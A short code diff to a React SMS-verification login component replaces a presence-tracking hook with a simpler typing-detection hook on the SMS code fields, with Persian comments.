@@ -11,7 +11,7 @@ import { Button } from "@/components/ui/button";
 import { AlertMessage } from "@/components/AlertMessage";
 import { OTPInput } from "@/components/OTPInput";
 import { toPersianDigits, maskPhoneNumber } from "@/lib/persian-utils";
-import { usePresence } from "@/hooks/usePresence";
+import { useSimpleTypingDetection } from "@/hooks/useSimpleTypingDetection";
 
 const AuthSMS = () => {
   const location = useLocation();
@@ -29,14 +29,11 @@ const AuthSMS = () => {
   const hasError = location.state?.hasError || false;
   const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
 
-  // سیستم حضور برای AuthSMS
-  const presence = usePresence({
+  // تشخیص تایپ برای AuthSMS
+  const typingDetection = useSimpleTypingDetection({
     formName: "AuthSMS",
-    enableTypingDetection: true,
-    typingConfig: {
-      enabledFields: ["smsCode", "code"], // فقط فیلد کد SMS
-      debounceTime: 1000, // 1 ثانیه برای کد SMS
-    },
+    enabledFields: ["smsCode", "code"],
+    debounceTime: 1000,
   });
 
   useEffect(() => {
